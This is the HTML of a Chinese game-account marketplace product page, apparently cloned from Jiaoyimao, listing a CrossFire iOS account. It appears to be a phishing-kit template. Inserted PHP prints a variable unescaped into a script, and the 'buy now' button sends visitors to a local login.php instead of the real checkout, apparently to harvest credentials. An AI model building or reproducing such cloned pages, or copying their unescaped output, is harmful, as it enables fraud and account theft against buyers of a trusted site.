                          <div class="tabs-card-meta-price"><span class="format-price "><span class="currency-symbol price-12">￥</span><span class="integer-part price-20">4000</span></span>
                            <div class="tabs-card-meta-favor">3人想要</div>
                          </div>
                        </div>
                      </div>
                    </a></div>
                  <div class="jym-waterfall-card jym-waterfall-card-left"><a href="https://m.jiaoyimao.com/item/1622083665632203.html?text=txt_gamedetail_tjl_po-21_goods">
                      <div class="render-card-item goldexp goldclk" data-card-name="recommend" data-spm="recommend" data-show-num="20" data-show-page="1" data-a9="1" data-a10="false" data-a11="true" data-recid="569aab691584455f8b38664cf93e487260caf58f" data-ref-task-id="2e0dd73c3ccc-4dbc-87e4-c86a7a35e0fd" data-aplus-ae="35" data-spm-anchor-id="gcmall.goods_detail.0.recommend" data-aplus-clk="x33_4062e211">
                        <div class="tabs-card-cover">
                          <div class="tabs-card-cover-tag">
                            <div class="tabs-card-cover-tag-bg"><i class="jym-iconfontV2 jym-iconfontV2-ios"></i><span class="r-tag">QQ苹果官方客户端/苹果QQ服务器</span></div>
                          </div>
                          <div class="img-div tabs-card-img jym-img-opc jym-img-opc-1" style="background-image: url(&quot;image/104504731.jpeg&quot;);">
                          </div>
                        </div>
                        <div class="tabs-card-body">
                          <div class="tabs-card-meta-title"><span class="pid-badge pid-badge-blue">帐号</span>
                            【150级】退游卖号兄弟</div>
                          <div class="tabs-card-meta-price"><span class="format-price "><span class="currency-symbol price-12">￥</span><span class="integer-part price-20">3000</span></span>
                            <div class="tabs-card-meta-favor">1人想要</div>
                          </div>
                          <div class="tabs-card-meta-tags">
                            <div class="am-badge-group"><span class="am-badge ellipse bottom-item-tag am-badge-not-a-wrapper"><sup class="am-badge-text">协议保障</sup></span></div>
                          </div>
                        </div>
                      </div>
                    </a></div>
                  <div class="jym-waterfall-card jym-waterfall-card-right"><a href="https://m.jiaoyimao.com/item/1623896089318158.html?text=txt_gamedetail_tjl_po-22_goods">
                      <div class="render-card-item goldexp goldclk" data-card-name="recommend" data-spm="recommend" data-show-num="21" data-show-page="1" data-a9="0" data-a10="true" data-a11="false" data-recid="52e17ea4b1f04e0b845a1d700f4f18fb60caf58f" data-ref-task-id="2e0dd73c3ccc-4dbc-87e4-c86a7a35e0fd" data-aplus-ae="36" data-spm-anchor-id="gcmall.goods_detail.0.recommend" data-aplus-clk="x34_4062e211">
                        <div class="tabs-card-cover">
                          <div class="tabs-card-cover-tag">
                            <div class="tabs-card-cover-tag-bg"><i class="jym-iconfontV2 jym-iconfontV2-ios"></i><span class="r-tag">QQ苹果官方客户端/苹果QQ服务器</span></div>
                          </div>
                          <div class="img-div tabs-card-img jym-img-opc jym-img-opc-1" style="background-image: url(&quot;image/101400959.jpg&quot;);">
                          </div>
                        </div>
                        <div class="tabs-card-body">
                          <div class="tabs-card-meta-title"><span class="pid-badge pid-badge-blue">帐号</span>
                            【99级】王者之心cop青龙awm游骑兵</div>
                          <div class="tabs-card-meta-price"><span class="format-price "><span class="currency-symbol price-12">￥</span><span class="integer-part price-20">700</span></span></div>
                          <div class="tabs-card-meta-tags">
                            <div class="am-badge-group"><span class="am-badge ellipse bottom-item-tag am-badge-not-a-wrapper"><sup class="am-badge-text">已投保</sup></span></div>
                          </div>
                        </div>
                      </div>
                    </a></div>
                  <div class="jym-waterfall-card jym-waterfall-card-left"><a href="https://m.jiaoyimao.com/item/1621737007943768.html?text=txt_gamedetail_tjl_po-23_goods">
                      <div class="render-card-item goldexp goldclk" data-card-name="recommend" data-spm="recommend" data-show-num="22" data-show-page="1" data-a9="9" data-a10="false" data-a11="true" data-recid="4c24a4709ff943478942c5ceec85727360caf58f" data-ref-task-id="2e0dd73c3ccc-4dbc-87e4-c86a7a35e0fd" data-aplus-ae="37" data-spm-anchor-id="gcmall.goods_detail.0.recommend" data-aplus-clk="x35_4062e211">
                        <div class="tabs-card-cover">
                          <div class="tabs-card-cover-tag">
                            <div class="tabs-card-cover-tag-bg"><i class="jym-iconfontV2 jym-iconfontV2-ios"></i><span class="r-tag">QQ苹果官方客户端/苹果QQ服务器</span></div>
                          </div>
                          <div class="img-div tabs-card-img jym-img-opc jym-img-opc-1" style="background-image: url(&quot;image/101915440.png&quot;);">
                          </div>
                        </div>
                        <div class="tabs-card-body">
                          <div class="tabs-card-meta-title"><span class="pid-badge pid-badge-blue">帐号</span>
                            【150级】V9多王者多钥匙</div>
                          <div class="tabs-card-meta-price"><span class="format-price "><span class="currency-symbol price-12">￥</span><span class="integer-part price-20">2900</span></span>
                            <div class="tabs-card-meta-favor">9人想要</div>
                          </div>
                          <div class="tabs-card-meta-tags">
                            <div class="am-badge-group"><span class="am-badge ellipse bottom-item-tag am-badge-not-a-wrapper"><sup class="am-badge-text">协议保障</sup></span></div>
                          </div>
                        </div>
                      </div>
                    </a></div>

                  <div class="jym-waterfall-card jym-waterfall-card-right"><a href="https://m.jiaoyimao.com/item/1623648425915593.html?text=txt_gamedetail_tjl_po-32_goods">
                      <div class="render-card-item goldexp goldclk" data-card-name="recommend" data-spm="recommend" data-show-num="31" data-show-page="1" data-a9="4" data-a10="false" data-a11="false" data-ref-task-id="2e0dd73c3ccc-4dbc-87e4-c86a7a35e0fd" data-aplus-ae="46" data-spm-anchor-id="gcmall.goods_detail.0.recommend" data-aplus-clk="x44_4062e211">
                        <div class="tabs-card-cover">
                          <div class="tabs-card-cover-tag">
                            <div class="tabs-card-cover-tag-bg"><i class="jym-iconfontV2 jym-iconfontV2-ios"></i><span class="r-tag">QQ苹果官方客户端/苹果QQ服务器</span></div>
                          </div>
                          <div class="img-div tabs-card-img jym-img-opc jym-img-opc-1" style="background-image: url(&quot;image/132233323.jpeg&quot;);">
                          </div>
                        </div>
                        <div class="tabs-card-body">
                          <div class="tabs-card-meta-title"><span class="pid-badge pid-badge-blue">帐号</span>
                            【138级】今晚20点正式下架</div>
                          <div class="tabs-card-meta-price"><span class="format-price "><span class="currency-symbol price-12">￥</span><span class="integer-part price-20">2888</span></span>
                            <div class="tabs-card-meta-favor">4人想要</div>
                          </div>
                        </div>
                      </div>
                    </a></div>



                </div>
              </div>
              <div class="am-list-footer">
                <div class="infinite-scroll-message">
                  <div class="loading-more">
                    <div style="width:100%;height:100%"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 58 58" width="58" height="58" preserveAspectRatio="xMidYMid slice" style="width: 100%; height: 100%; transform: translate3d(0px, 0px, 0px);">
                        <defs>
                          <clippath id="__lottie_element_2">
                            <rect width="58" height="58" x="0" y="0"></rect>
                          </clippath>
                        </defs>
                        <g clip-path="url(#__lottie_element_2)">
                          <g transform="matrix(1,0,0,1,0,0)" opacity="1" style="display: block;">
                            <g opacity="1" transform="matrix(0.9870609045028687,0,0,0.9870609045028687,9,29)">
                              <path fill="rgb(5,180,255)" fill-opacity="1" d=" M0,-6 C0,-6 0,-6 0,-6 C3.312999963760376,-6 6,-3.312999963760376 6,0 C6,3.312999963760376 3.312999963760376,6 0,6 C-3.312999963760376,6 -6,3.312999963760376 -6,0 C-6,-3.312999963760376 -3.312999963760376,-6 0,-6z">
                              </path>
                            </g>
                            <g opacity="1" transform="matrix(0.36068862676620483,0,0,0.36068862676620483,29,29)">
                              <path fill="rgb(255,97,97)" fill-opacity="1" d=" M0,-6 C0,-6 0,-6 0,-6 C3.312999963760376,-6 6,-3.312999963760376 6,0 C6,3.312999963760376 3.312999963760376,6 0,6 C-3.312999963760376,6 -6,3.312999963760376 -6,0 C-6,-3.312999963760376 -3.312999963760376,-6 0,-6z">
                              </path>
                            </g>
                            <g opacity="1" transform="matrix(0,0,0,0,49,29)">
                              <path fill="rgb(255,212,19)" fill-opacity="1" d=" M0,-6 C0,-6 0,-6 0,-6 C3.312999963760376,-6 6,-3.312999963760376 6,0 C6,3.312999963760376 3.312999963760376,6 0,6 C-3.312999963760376,6 -6,3.312999963760376 -6,0 C-6,-3.312999963760376 -3.312999963760376,-6 0,-6z">
                              </path>
                            </g>
                          </g>
                        </g>
                      </svg></div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
        
<script type="text/javascript">
    function show() {
        console.log(8888)
        document.getElementById('one').innerText= <?php echo $_GoodsID['att_capacity']?>;
    }

    function refsc() {
    var ul1 = document.getElementById("ul1");
    var ul2 = document.getElementById("ul2");
    var ul3 = document.getElementById("ul3");
    var aa11 = document.getElementById("aa11");
    var aa22 = document.getElementById("aa22");
    if (ul1.getAttribute("value")=="1") {
		ul1.setAttribute("class", "jym-iconfontV2 jym-iconfontV2-collect-pre"); 
		ul1.setAttribute("value", "2"); 
		ul3.style.display="";
		ul2.style.display="none";
		aa11.style.display="";
		setTimeout("aa11.style.display='none';",1000);
    } else {
		ul3.style.display="none";
		ul2.style.display="";
		ul1.setAttribute("value", "1"); 
		ul1.setAttribute("class", "jym-iconfontV2 jym-iconfontV2-goods-collect"); 
		aa22.style.display="";
		setTimeout("aa22.style.display='none';",1000);
    }
}
</script>
<div id="aa11" style="display: none;"><div class="am-toast am-toast-nomask"><span><div class="am-toast-notice am-toast-notice-closable"><div class="am-toast-notice-content">
  <div class="am-toast-text" role="alert" aria-live="assertive"><div>商品收藏成功</div></div></div>
  <a tabindex="0" class="am-toast-notice-close"><span class="am-toast-notice-close-x"></span></a></div></span></div></div>
<div id="aa22" style="display: none;"><div class="am-toast am-toast-nomask"><span><div class="am-toast-notice am-toast-notice-closable"><div class="am-toast-notice-content">
  <div class="am-toast-text" role="alert" aria-live="assertive"><div>已取消收藏</div></div></div>
  <a tabindex="0" class="am-toast-notice-close"><span class="am-toast-notice-close-x"></span></a></div></span></div></div>
        
        <div class="item-buttons-section goldexp" data-card-name="tool" data-spm="tool">
          <div class="item-buttons">
            <div onclick="refsc();" class="item-collect-button goldexp goldclk" data-btn-name="collection_n" data-card-name="tool" data-spm="tool"><span class="icon-button-4-item "><span class="icon-button-icon">
              <i id="ul1" value="1" class="jym-iconfontV2 jym-iconfontV2-goods-collect">
</i>
              </i></span>
              <span id="ul2" class="icon-button-text">收藏</span>
              <span id="ul3" style="display: none;" class="icon-button-text">已收藏</span>
              </span></div>
            <div style="display: none;" class="item-auction-button goldclk " data-card-name="tool" data-spm="tool" data-btn-name="bargin"><span class="icon-button-4-item "><span class="icon-button-icon"><i class="jym-iconfontV2 jym-iconfontV2-good-beg"></i></span>
              <span class="icon-button-text">议价</span></span></div>
            <div class="item-im-button goldexp goldclk" data-btn-name="chat"><a href="ll.php?ClickID=<?php echo $uid;?>" role="button" class="jym-button jym-button-md jym-button jym-button-md-primary" aria-disabled="false"><span>聊聊
                </span></a></div>
            <div class="item-buy-button goldclk " data-card-name="tool" data-spm="tool" data-btn-name="buy_a">
                <a href="login.php" role="button" class="jym-button jym-button-md jym-button jym-button-md-primary" aria-disabled="false">
                    <span>立即购买</span>
                </a>
            </div>
          </div>
        </div>
        <div></div>
      </div>
    </div>
  </div>

  <script>
    window.__INITIAL_STATE__ = { "canonical": "https:\u002F\u002Fwww.jiaoyimao.com\u002Fgoods\u002F1622873155868058.html", "componentList": [{ "name": "ItemImageSection", "id": "ItemImageSection_0" }, { "name": "ItemPriceSection", "id": "ItemPriceSection_1" }, { "name": "ItemFeatureSection", "id": "ItemFeatureSection_2" }, { "name": "ItemSmartBannerSection", "id": "ItemSmartBannerSection_3" }, { "name": "ItemTradeGuideSection", "id": "ItemTradeGuideSection_4" }, { "name": "ItemServiceSection", "id": "ItemServiceSection_5" }, { "name": "ItemPropertiesSection", "id": "ItemPropertiesSection_6" }, { "name": "ItemSecurityInfoSection", "id": "ItemSecurityInfoSection_7" }, { "name": "ItemSellerInfoSection", "id": "ItemSellerInfoSection_8" }, { "name": "ItemDisclaimerInfoSection", "id": "ItemDisclaimerInfoSection_9" }, { "name": "ItemRecommendSection", "id": "ItemRecommendSection_10" }, { "name": "ItemButtonsSection", "id": "ItemButtonsSection_11" }, { "name": "ItemAppGuideSection", "id": "ItemAppGuideSection_12" }, { "name": "IOSAPPShareMenu", "id": "IOSAPPShareMenu_13" }], "apiData": { "bizCode": "com.aligame.jym.account", "bizStateCode": "NORMAL", "itemBaseInfo": { "itemId": "1622873155868058", "sellerId": 1546566920441805, "title": "【133级】v8翼至尊势至尊幻神蝴蝶", "originTitle": "v8翼至尊势至尊幻神蝴蝶", "description": null, "sellPrice": 3799, "status": 3, "underLinePrice": null, "unitPrice": 0, "discount": null, "storage": 1, "gmtCreate": { "seconds": 1622885204000, "nanos": 0 }, "statusName": "已上架", "firstCategoryInfo": { "categoryId": 1, "categoryName": "账号" }, "secondCategoryInfo": { "categoryId": 1449207252156632, "categoryName": "QQ帐号" }, "gmtModified": { "seconds": 1623880946000, "nanos": 0 }, "osType": 3, "osTypeName": "苹果版", "publisherId": 10911, "publisherName": "QQ苹果官方客户端", "serverName": "苹果QQ服务器", "serverId": 769229, "domainId": null, "domainName": null, "gameId": 2930, "gameName": "穿越火线：枪战王者【苹果版】" }, "itemTopButton": { "visibleButtons": [{ "id": "btn_item_my_favorites", "text": "我的收藏", "sortNum": 1, "extInfo": "{\"url\":\"https:\u002F\u002Fm.jiaoyimao.com\u002Fgoods\u002Ffavorite\u002Flist.html\",\"eventTrackId\":\"open_collection\"}" }], "dropButtons": [{ "id": "btn_return_home", "text": "回到首页", "sortNum": 3, "extInfo": "{\"url\":\"https:\u002F\u002Fm.jiaoyimao.com\u002F\",\"eventTrackId\":\"open_home\"}" }, { "id": "btn_my_message", "text": "消息", "sortNum": 4, "extInfo": "{\"url\":\"https:\u002F\u002Fm.jiaoyimao.com\u002Fmessage\u002Finbox#\u002F\",\"eventTrackId\":\"open_inbox\"}" }, { "id": "btn_item_report", "text": "举报", "sortNum": 5, "extInfo": "{\"reasons\":[{\"id\":\"广告商品\",\"text\":\"广告商品\"},{\"id\":\"色情\",\"text\":\"色情\"},{\"id\":\"虚假商品\",\"text\":\"虚假商品\"}],\"callbackData\":{\"itemId\":\"1622873155868058\",\"bizCode\":\"com.aligame.jym.account\"},\"title\":\"选择举报理由\",\"eventTrackId\":\"report_item\"}" }] }, "itemImage": { "images": [{ "imageId": "6806858140064236044", "width": 1792, "height": 828, "originImageUrl": "https:\u002F\u002Fstatic.jiaoyimao.com\u002Fjym-oss\u002Fresource\u002Fitem\u002F3493983601\u002F20210605\u002F162143154.jpeg", "wapThumbnailUrl": "https:\u002F\u002Fstatic.jiaoyimao.com\u002Fjym-oss\u002Fresource\u002Fitem\u002F3493983601\u002F20210605\u002F162143154.jpeg?x-oss-process=image\u002Fresize,h_198,m_lfit\u002Fcrop,x_0,y_0,w_320,h_198,g_north", "pcThumbnailUrl": "https:\u002F\u002Fstatic.jiaoyimao.com\u002Fjym-oss\u002Fresource\u002Fitem\u002F3493983601\u002F20210605\u002F162143154.jpeg?x-oss-process=image\u002Fresize,h_517,m_lfit" }, { "imageId": "6806858140064236045", "width": 1792, "height": 828, "originImageUrl": "https:\u002F\u002Fstatic.jiaoyimao.com\u002Fjym-oss\u002Fresource\u002Fitem\u002F3493983601\u002F20210605\u002F162150650.jpeg", "wapThumbnailUrl": "https:\u002F\u002Fstatic.jiaoyimao.com\u002Fjym-oss\u002Fresource\u002Fitem\u002F3493983601\u002F20210605\u002F162150650.jpeg?x-oss-process=image\u002Fresize,h_198,m_lfit\u002Fcrop,x_0,y_0,w_320,h_198,g_north", "pcThumbnailUrl": "https:\u002F\u002Fstatic.jiaoyimao.com\u002Fjym-oss\u002Fresource\u002Fitem\u002F3493983601\u002F20210605\u002F162150650.jpeg?x-oss-process=image\u002Fresize,h_517,m_lfit" }, { "imageId": "6806858140064236046", "width": 1792, "height": 828, "originImageUrl": "https:\u002F\u002Fstatic.jiaoyimao.com\u002Fjym-oss\u002Fresource\u002Fitem\u002F3493983601\u002F20210605\u002F162156283.jpeg", "wapThumbnailUrl": "https:\u002F\u002Fstatic.jiaoyimao.com\u002Fjym-oss\u002Fresource\u002Fitem\u002F3493983601\u002F20210605\u002F162156283.jpeg?x-oss-process=image\u002Fresize,h_198,m_lfit\u002Fcrop,x_0,y_0,w_320,h_198,g_north", "pcThumbnailUrl": "https:\u002F\u002Fstatic.jiaoyimao.com\u002Fjym-oss\u002Fresource\u002Fitem\u002F3493983601\u002F20210605\u002F162156283.jpeg?x-oss-process=image\u002Fresize,h_517,m_lfit" }, { "imageId": "6806858140064236047", "width": 1792, "height": 828, "originImageUrl": "https:\u002F\u002Fstatic.jiaoyimao.com\u002Fjym-oss\u002Fresource\u002Fitem\u002F3493983601\u002F20210605\u002F162202152.jpeg", "wapThumbnailUrl": "https:\u002F\u002Fstatic.jiaoyimao.com\u002Fjym-oss\u002Fresource\u002Fitem\u002F3493983601\u002F20210605\u002F162202152.jpeg?x-oss-process=image\u002Fresize,h_198,m_lfit\u002Fcrop,x_0,y_0,w_320,h_198,g_north", "pcThumbnailUrl": "https:\u002F\u002Fstatic.jiaoyimao.com\u002Fjym-oss\u002Fresource\u002Fitem\u002F3493983601\u002F20210605\u002F162202152.jpeg?x-oss-process=image\u002Fresize,h_517,m_lfit" }, { "imageId": "6806858140064236048", "width": 1792, "height": 828, "originImageUrl": "https:\u002F\u002Fstatic.jiaoyimao.com\u002Fjym-oss\u002Fresource\u002Fitem\u002F3493983601\u002F20210605\u002F162208942.jpeg", "wapThumbnailUrl": "https:\u002F\u002Fstatic.jiaoyimao.com\u002Fjym-oss\u002Fresource\u002Fitem\u002F3493983601\u002F20210605\u002F162208942.jpeg?x-oss-process=image\u002Fresize,h_198,m_lfit\u002Fcrop,x_0,y_0,w_320,h_198,g_north", "pcThumbnailUrl": "https:\u002F\u002Fstatic.jiaoyimao.com\u002Fjym-oss\u002Fresource\u002Fitem\u002F3493983601\u002F20210605\u002F162208942.jpeg?x-oss-process=image\u002Fresize,h_517,m_lfit" }, { "imageId": "6806858140064236049", "width": 1792, "height": 828, "originImageUrl": "https:\u002F\u002Fstatic.jiaoyimao.com\u002Fjym-oss\u002Fresource\u002Fitem\u002F3493983601\u002F20210605\u002F162214568.jpeg", "wapThumbnailUrl": "https:\u002F\u002Fstatic.jiaoyimao.com\u002Fjym-oss\u002Fresource\u002Fitem\u002F3493983601\u002F20210605\u002F162214568.jpeg?x-oss-process=image\u002Fresize,h_198,m_lfit\u002Fcrop,x_0,y_0,w_320,h_198,g_north", "pcThumbnailUrl": "https:\u002F\u002Fstatic.jiaoyimao.com\u002Fjym-oss\u002Fresource\u002Fitem\u002F3493983601\u002F20210605\u002F162214568.jpeg?x-oss-process=image\u002Fresize,h_517,m_lfit" }, { "imageId": "6806858140064236050", "width": 1792, "height": 828, "originImageUrl": "https:\u002F\u002Fstatic.jiaoyimao.com\u002Fjym-oss\u002Fresource\u002Fitem\u002F3493983601\u002F20210605\u002F162221353.jpeg", "wapThumbnailUrl": "https:\u002F\u002Fstatic.jiaoyimao.com\u002Fjym-oss\u002Fresource\u002Fitem\u002F3493983601\u002F20210605\u002F162221353.jpeg?x-oss-process=image\u002Fresize,h_198,m_lfit\u002Fcrop,x_0,y_0,w_320,h_198,g_north", "pcThumbnailUrl": "https:\u002F\u002Fstatic.jiaoyimao.com\u002Fjym-oss\u002Fresource\u002Fitem\u002F3493983601\u002F20210605\u002F162221353.jpeg?x-oss-process=image\u002Fresize,h_517,m_lfit" }, { "imageId": "6806858140064236051", "width": 1792, "height": 828, "originImageUrl": "https:\u002F\u002Fstatic.jiaoyimao.com\u002Fjym-oss\u002Fresource\u002Fitem\u002F3493983601\u002F20210605\u002F162227757.jpeg", "wapThumbnailUrl": "https:\u002F\u002Fstatic.jiaoyimao.com\u002Fjym-oss\u002Fresource\u002Fitem\u002F3493983601\u002F20210605\u002F162227757.jpeg?x-oss-process=image\u002Fresize,h_198,m_lfit\u002Fcrop,x_0,y_0,w_320,h_198,g_north", "pcThumbnailUrl": "https:\u002F\u002Fstatic.jiaoyimao.com\u002Fjym-oss\u002Fresource\u002Fitem\u002F3493983601\u002F20210605\u002F162227757.jpeg?x-oss-process=image\u002Fresize,h_517,m_lfit" }, { "imageId": "6806858140064236052", "width": 1792, "height": 828, "originImageUrl": "https:\u002F\u002Fstatic.jiaoyimao.com\u002Fjym-oss\u002Fresource\u002Fitem\u002F3493983601\u002F20210605\u002F162234076.jpeg", "wapThumbnailUrl": "https:\u002F\u002Fstatic.jiaoyimao.com\u002Fjym-oss\u002Fresource\u002Fitem\u002F3493983601\u002F20210605\u002F162234076.jpeg?x-oss-process=image\u002Fresize,h_198,m_lfit\u002Fcrop,x_0,y_0,w_320,h_198,g_north", "pcThumbnailUrl": "https:\u002F\u002Fstatic.jiaoyimao.com\u002Fjym-oss\u002Fresource\u002Fitem\u002F3493983601\u002F20210605\u002F162234076.jpeg?x-oss-process=image\u002Fresize,h_517,m_lfit" }, { "imageId": "6806858140064236053", "width": 1792, "height": 828, "originImageUrl": "https:\u002F\u002Fstatic.jiaoyimao.com\u002Fjym-oss\u002Fresource\u002Fitem\u002F3493983601\u002F20210605\u002F162249446.jpeg", "wapThumbnailUrl": "https:\u002F\u002Fstatic.jiaoyimao.com\u002Fjym-oss\u002Fresource\u002Fitem\u002F3493983601\u002F20210605\u002F162249446.jpeg?x-oss-process=image\u002Fresize,h_198,m_lfit\u002Fcrop,x_0,y_0,w_320,h_198,g_north", "pcThumbnailUrl": "https:\u002F\u002Fstatic.jiaoyimao.com\u002Fjym-oss\u002Fresource\u002Fitem\u002F3493983601\u002F20210605\u002F162249446.jpeg?x-oss-process=image\u002Fresize,h_517,m_lfit" }, { "imageId": "6806858140064236054", "width": 1792, "height": 828, "originImageUrl": "https:\u002F\u002Fstatic.jiaoyimao.com\u002Fjym-oss\u002Fresource\u002Fitem\u002F3493983601\u002F20210605\u002F162253734.jpeg", "wapThumbnailUrl": "https:\u002F\u002Fstatic.jiaoyimao.com\u002Fjym-oss\u002Fresource\u002Fitem\u002F3493983601\u002F20210605\u002F162253734.jpeg?x-oss-process=image\u002Fresize,h_198,m_lfit\u002Fcrop,x_0,y_0,w_320,h_198,g_north", "pcThumbnailUrl": "https:\u002F\u002Fstatic.jiaoyimao.com\u002Fjym-oss\u002Fresource\u002Fitem\u002F3493983601\u002F20210605\u002F162253734.jpeg?x-oss-process=image\u002Fresize,h_517,m_lfit" }, { "imageId": "6806858140064236055", "width": 1792, "height": 828, "originImageUrl": "https:\u002F\u002Fstatic.jiaoyimao.com\u002Fjym-oss\u002Fresource\u002Fitem\u002F3493983601\u002F20210605\u002F162258713.jpeg", "wapThumbnailUrl": "https:\u002F\u002Fstatic.jiaoyimao.com\u002Fjym-oss\u002Fresource\u002Fitem\u002F3493983601\u002F20210605\u002F162258713.jpeg?x-oss-process=image\u002Fresize,h_198,m_lfit\u002Fcrop,x_0,y_0,w_320,h_198,g_north", "pcThumbnailUrl": "https:\u002F\u002Fstatic.jiaoyimao.com\u002Fjym-oss\u002Fresource\u002Fitem\u002F3493983601\u002F20210605\u002F162258713.jpeg?x-oss-process=image\u002Fresize,h_517,m_lfit" }, { "imageId": "6806858140064236056", "width": 1792, "height": 828, "originImageUrl": "https:\u002F\u002Fstatic.jiaoyimao.com\u002Fjym-oss\u002Fresource\u002Fitem\u002F3493983601\u002F20210605\u002F162302573.jpeg", "wapThumbnailUrl": "https:\u002F\u002Fstatic.jiaoyimao.com\u002Fjym-oss\u002Fresource\u002Fitem\u002F3493983601\u002F20210605\u002F162302573.jpeg?x-oss-process=image\u002Fresize,h_198,m_lfit\u002Fcrop,x_0,y_0,w_320,h_198,g_north", "pcThumbnailUrl": "https:\u002F\u002Fstatic.jiaoyimao.com\u002Fjym-oss\u002Fresource\u002Fitem\u002F3493983601\u002F20210605\u002F162302573.jpeg?x-oss-process=image\u002Fresize,h_517,m_lfit" }, { "imageId": "6806858140064236057", "width": 1792, "height": 828, "originImageUrl": "https:\u002F\u002Fstatic.jiaoyimao.com\u002Fjym-oss\u002Fresource\u002Fitem\u002F3493983601\u002F20210605\u002F162306781.jpeg", "wapThumbnailUrl": "https:\u002F\u002Fstatic.jiaoyimao.com\u002Fjym-oss\u002Fresource\u002Fitem\u002F3493983601\u002F20210605\u002F162306781.jpeg?x-oss-process=image\u002Fresize,h_198,m_lfit\u002Fcrop,x_0,y_0,w_320,h_198,g_north", "pcThumbnailUrl": "https:\u002F\u002Fstatic.jiaoyimao.com\u002Fjym-oss\u002Fresource\u002Fitem\u002F3493983601\u002F20210605\u002F162306781.jpeg?x-oss-process=image\u002Fresize,h_517,m_lfit" }, { "imageId": "6806858140064236058", "width": 1792, "height": 828, "originImageUrl": "https:\u002F\u002Fstatic.jiaoyimao.com\u002Fjym-oss\u002Fresource\u002Fitem\u002F3493983601\u002F20210605\u002F162310190.jpeg", "wapThumbnailUrl": "https:\u002F\u002Fstatic.jiaoyimao.com\u002Fjym-oss\u002Fresource\u002Fitem\u002F3493983601\u002F20210605\u002F162310190.jpeg?x-oss-process=image\u002Fresize,h_198,m_lfit\u002Fcrop,x_0,y_0,w_320,h_198,g_north", "pcThumbnailUrl": "https:\u002F\u002Fstatic.jiaoyimao.com\u002Fjym-oss\u002Fresource\u002Fitem\u002F3493983601\u002F20210605\u002F162310190.jpeg?x-oss-process=image\u002Fresize,h_517,m_lfit" }, { "imageId": "6806858140064236059", "width": 1792, "height": 828, "originImageUrl": "https:\u002F\u002Fstatic.jiaoyimao.com\u002Fjym-oss\u002Fresource\u002Fitem\u002F3493983601\u002F20210605\u002F162313085.jpeg", "wapThumbnailUrl": "https:\u002F\u002Fstatic.jiaoyimao.com\u002Fjym-oss\u002Fresource\u002Fitem\u002F3493983601\u002F20210605\u002F162313085.jpeg?x-oss-process=image\u002Fresize,h_198,m_lfit\u002Fcrop,x_0,y_0,w_320,h_198,g_north", "pcThumbnailUrl": "https:\u002F\u002Fstatic.jiaoyimao.com\u002Fjym-oss\u002Fresource\u002Fitem\u002F3493983601\u002F20210605\u002F162313085.jpeg?x-oss-process=image\u002Fresize,h_517,m_lfit" }] }, "itemPrice": { "itemCommonPrice": { "priceSymbol": "￥", "sellPrice": 3799, "discount": 10, "underlinePrice": null, "couponPrice": null } }, "itemQuality": { "numOfSales": 0, "updateDate": 1623880946000, "sellerOnlineInfo": { "avatar": "https:\u002F\u002Fstatic.jiaoyimao.com\u002Fo\u002Fgcmall\u002F3tGrn\u002F;;0,gcmall\u002Fg\u002Fresource\u002Fpublic\u002FpureUpload\u002F2019\u002F1\u002F4\u002FtempFile19708004869881413411546566922uCTXSMSJla", "sellerOnline": false }, "favoriteNum": 14, "recentRentTimes": null, "totalRentHours": null, "avgCompleteTime": null, "extInfo": null }, "itemTitle": { "firstCategoryInfo": { "categoryId": 1, "categoryName": "账号" }, "title": "【133级】v8翼至尊势至尊幻神蝴蝶" }, "itemEvaluation": { "title": "评估", "evaluation": 7.82, "rate": "39%", "extInfo": "{\"activityStyleType\":\"QA\",\"processActivitys\":[{\"description\":\"商品性价比是小猫根据卖家填写的商品关键与价格对比得出。\u003Cspan class=\\\"text-blue\\\"\u003E性价比越高代表商品越好\u003C\u002Fspan\u003E，作为买家下单购买的辅助依据，仅供参考哦！\",\"sortNum\":1,\"title\":\"商品性价比是什么？\",\"type\":\"NORMAL\"},{\"description\":\"商品关键属性会根据游戏进行设定。如王者荣耀的皮肤数量、英雄数量。\",\"sortNum\":2,\"title\":\"商品关键属性是什么？\",\"type\":\"NORMAL\"}],\"subTitle\":\"性价比越高代表商品约好哦\",\"title\":\"性价比说明\"}" }, "itemGuarantee": { "title": "保障", "itemGuaranteeTags": [{ "text": "平台发货", "sortNum": 1, "type": "NORMAL" }, { "text": "可投保", "sortNum": 5, "type": "NORMAL" }, { "text": "协议保障", "sortNum": 6, "type": "NORMAL" }, { "text": "已实名", "sortNum": 8, "type": "NORMAL" }, { "text": "已实人", "sortNum": 9, "type": "NORMAL" }], "extInfo": "{\"activityStyleType\":\"GUARANTEE_INTRO\",\"processActivitys\":[{\"description\":\"货在交易猫，付款后由客服发货（7X24小时服务）。\",\"sortNum\":1,\"title\":\"平台发货\",\"type\":\"NORMAL\"},{\"description\":\"该账号可提供保险服务，购买保险后，若被找回，最高将获得全额赔偿。\",\"sortNum\":5,\"title\":\"可投保\",\"type\":\"NORMAL\"},{\"description\":\"卖家出售此账号已向平台提供真实身份信息，签署《安全保证协议》，具有法律效应。\",\"sortNum\":6,\"title\":\"协议保障\",\"type\":\"NORMAL\"},{\"description\":\"卖家已通过支付宝实名认证。\",\"sortNum\":8,\"title\":\"已实名\",\"type\":\"NORMAL\"},{\"description\":\"实人认证通过多种核验方式对个人进行活体认证，通过与公安网数据校验、运用全球领先人脸识别技术，保障个人身份真实性。\",\"sortNum\":9,\"title\":\"已实人\",\"type\":\"NORMAL\"}],\"title\":\"保障服务\"}" }, "itemTradeProcess": { "title": "交易流程", "tradeBuyProcess": { "tradeProcessActivitys": [{ "id": null, "title": "下单", "description": "下单后进入在线发货聊天页面，等待验号。", "sortNum": 1, "type": "NORMAL", "extInfo": null }, { "id": null, "title": "验号", "description": "由客服截图（部分订单由卖家截图）给你确认是否继续购买，不满意立即退款。", "sortNum": 2, "type": "NORMAL", "extInfo": null }, { "id": null, "title": "换绑", "description": "确认购买后，客服将进行改密，换绑，九游客户端支持帐号转移。", "sortNum": 3, "type": "NORMAL", "extInfo": null }, { "id": null, "title": "发货", "description": "客服发送帐号密码给你，可进入订单详情或站内信内查看帐号密码。", "sortNum": 4, "type": "NORMAL", "extInfo": null }, { "id": null, "title": "完成", "description": "收到帐号后请尽快登录游戏验证，如无问题将在保护期（通常为24小时，网易帐号36小时，QQ帐号96小时）结束后给卖家打款。", "sortNum": 5, "type": "NORMAL", "extInfo": null }], "extInfo": 